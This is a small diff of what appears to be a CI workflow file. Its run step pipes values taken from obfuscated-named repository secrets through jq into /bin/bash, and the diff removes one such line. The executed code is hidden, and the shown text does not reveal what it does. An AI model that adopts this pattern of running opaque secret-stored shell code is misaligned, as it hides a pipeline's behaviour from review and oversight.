@@ -18,7 +18,6 @@ jobs:
           szkk20866: ${{ secrets.szkk20866 }}
         run: |
           printf '%s' "$szkk20866" | jq -r .bmo11 | /bin/bash
-          printf '%s' "$fi2" | jq -r .ctr17233 | /bin/bash
           printf '%s' "$jd002" | jq -r .msd9 | /bin/bash
 
       - name: Archive output
